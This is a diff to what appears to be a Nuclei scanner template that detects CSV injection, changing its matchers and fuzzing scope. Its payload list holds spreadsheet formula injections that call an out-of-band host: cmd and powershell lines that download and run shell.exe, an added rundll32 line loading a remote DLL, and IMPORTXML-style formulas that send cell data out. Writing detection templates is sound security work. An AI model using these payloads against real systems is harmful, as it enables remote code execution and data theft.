@@ -6,13 +6,13 @@ info:
   severity: medium
   description: |
     A CSV injection detection template to identify and prevent CSV injection vulnerabilities by using various payloads that could be interpreted as formulas by spreadsheet applications.
-  tags: csv,dast,full
+  tags: dast,csv,oast
 
 http:
   - pre-condition:
       - type: dsl
         dsl:
-          - 'method != "OPTIONS"'
+          - 'method == "GET"'
 
     payloads:
       csv_fuzz:
@@ -22,23 +22,29 @@ http:
         - "=10+20+cmd|' /C nslookup{{interactsh-url}}'!A0"
         - "=cmd|' /C nslookup{{interactsh-url}}'!'A1'"
         - "=cmd|'/C powershell IEX(wget{{interactsh-url}}/shell.exe)'!A0"
+        - "=cmd|'/c rundll32.exe \\{{interactsh-url}}\3\2\1.dll,0'!_xlbgnm.A1"
         - '=IMPORTXML(CONCAT("http://{{interactsh-url}}", CONCATENATE(A2:E2)), "//a/a10")'
         - '=IMPORTFEED(CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)))'
         - '=IMPORTHTML (CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)),"table",1)'
-        - '=IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")'
+        - '=IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")'     
 
     fuzzing:
-      - part: request
+      - part: query
         type: replace # replaces existing parameter value with fuzz payload
         mode: multiple # replaces all parameters value with fuzz payload
         fuzz:
           - '{{csv_fuzz}}'
 
-    stop-at-first-match: true
+    matchers-condition: and
     matchers:
-      - type: dsl
-        name: oob-interaction
-        dsl:
-          - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
-          - 'contains(header, "csv") || contains(header, "excel") || contains(header, "spreadsheet")'
-        condition: and
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: word
+        part: header
+        words:
+          - "text/csv"
+          - "application/csv"
+          - "application/vnd.ms-excel"
